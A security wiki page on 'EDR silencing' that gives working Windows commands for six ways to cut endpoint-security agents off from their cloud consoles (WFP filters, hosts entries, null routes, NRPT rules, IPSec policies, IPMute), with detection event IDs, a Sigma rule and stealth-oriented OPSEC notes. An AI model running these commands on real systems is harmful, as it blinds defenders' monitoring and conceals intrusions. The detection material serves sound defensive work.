---
title: EDR Silencing
permalink: /wiki/concepts/edr-silencing/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
redirect_from:
- /wiki/offsec-notes/concepts/edr-silencing/
---

**Category:** Defense Evasion
**MITRE ATT&CK:** T1562.001 — Impair Defenses: Disable or Modify Tools; T1562.004 — Disable or Modify System Firewall
**Related:** [Evasion Techniques](/wiki/concepts/evasion-techniques/), [Applocker Abuse](/wiki/concepts/applocker-abuse/), [Bind Link Edr Tampering](/wiki/concepts/bind-link-edr-tampering/)

## Overview
EDR silencing techniques cut the communication channel between an EDR agent and its cloud backend without disabling the agent process. The agent continues running and appears healthy locally while telemetry, alerts, and threat intelligence no longer flow to the console. Six documented approaches achieve this at the network level.

## Technique 1: Windows Filtering Platform (WFP) — EDRSilencer

**Tool:** EDRSilencer (github.com/netbiosX/EDRSilencer)

Uses the WFP API to add firewall filters that block all outbound traffic from target EDR executables by application ID. Filters persist until explicitly removed or system reboot.

```powershell
# Block all EDR processes
EDRSilencer.exe blockedr

# Unblock
EDRSilencer.exe unblockedr
```

**Core APIs:** `FwpmFilterAdd0`, `FwpmProviderAdd0`  
**Detection Event IDs:**
- 5444 — WFP provider added
- 5441 — WFP filter added
- 5157 — Connection blocked (generated when EDR tries to connect out and is blocked)

### SIGMA (WFP blocking EDR)
```yaml
title: WFP Filter Blocking EDR Communications
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5157
    Application|contains:
      - 'CrowdStrike'
      - 'SentinelOne'
      - 'Carbon Black'
      - 'MDE'
  condition: selection
level: high
```

## Technique 2: Hosts File Manipulation

Add EDR cloud endpoints to `C:\Windows\System32\drivers\etc\hosts` resolving to `127.0.0.1`.

```powershell
# Add entries (requires admin)
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "127.0.0.1 api.crowdstrike.com"
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "127.0.0.1 ts01-b.sp.sentinel.one"
```

**Detection:** Event ID 4663 (file access on hosts file with write access)

## Technique 3: Routing Table Blackholing

Add a null route for EDR IP ranges, dropping all traffic to those destinations.

```powershell
# Blackhole EDR IP range
New-NetRoute -DestinationPrefix "198.51.100.0/24" -InterfaceIndex 1 -NextHop "127.0.0.1"
```

**Detection:** Unexpected route additions via `netstat -r` monitoring or WMI; no native Windows event for route addition

## Technique 4: NRPT (Name Resolution Policy Table)

Redirect EDR DNS queries to localhost using the NRPT, which overrides normal DNS resolution for specified domains.

```powershell
# Redirect EDR domains to 127.0.0.1
Add-DnsClientNrptRule -Namespace "*.crowdstrike.com" -NameServers "127.0.0.1"
Add-DnsClientNrptRule -Namespace "*.sentinelone.net" -NameServers "127.0.0.1"
```

**Registry location:** `HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient\DnsPolicyConfig`  
**Detection:** Registry key creation under DnsPolicyConfig by non-Group Policy processes

## Technique 5: IPSec Filter Rules

Use netsh to create IPSec policies that block traffic to EDR IP ranges.

```cmd
netsh ipsec static add policy name="BlockEDR"
netsh ipsec static add filterlist name="EDRIPs"
netsh ipsec static add filter filterlist="EDRIPs" srcaddr=any dstaddr=198.51.100.0/24 protocol=tcp
netsh ipsec static add filteraction name="Block" action=block
netsh ipsec static add rule name="BlockEDR" policy="BlockEDR" filterlist="EDRIPs" filteraction="Block"
netsh ipsec static set policy name="BlockEDR" assign=yes
```

**Detection Event IDs:** 5460, 5471 (IPSec policy changes)

## Technique 6: Secondary IP Addresses (IPMute)

**Tool:** IPMute (PowerShell — github.com/SilentDev33/IPMute)

Monitors active TCP connections made by EDR processes. For each connection to an EDR server IP, assigns that remote IP as a secondary local IP on the network adapter. This causes Windows to route EDR traffic to itself.

```powershell
# Auto-detect EDR connections and neutralize them
IPMute.ps1 -ProcessName "CSFalconService"
```

**Why stealthy:** No firewall rules, no routing changes — just secondary IP assignment via `netsh` or `New-NetIPAddress`

## Comparison

| Technique | Requires Admin | Persistence | Detectability | Reversibility |
|-----------|---------------|-------------|---------------|---------------|
| WFP (EDRSilencer) | Yes | Until reboot/unblock | Medium (Event 5157) | Easy |
| Hosts file | Yes | Permanent until removed | High (Event 4663) | Easy |
| Routing table | Yes | Until reboot | Low | Easy |
| NRPT | Yes | Permanent | Medium (Registry) | Easy |
| IPSec | Yes | Permanent | Medium (Events 5460/5471) | Easy |
| IPMute | Yes | Until reboot | Low | Easy |

## OPSEC Notes
- WFP approach is the most commonly implemented but the easiest to detect via Event 5157
- NRPT and routing table approaches leave minimal immediate log traces
- IPMute is the stealthiest but requires knowing EDR remote IPs
- All approaches require Local Administrator minimum
- Combine with persistence if reboots are expected

## References
- ipurple.team — "EDR Silencing" (2026-01-12)
- EDRSilencer — github.com/netbiosX/EDRSilencer
- IPMute — github.com/SilentDev33/IPMute
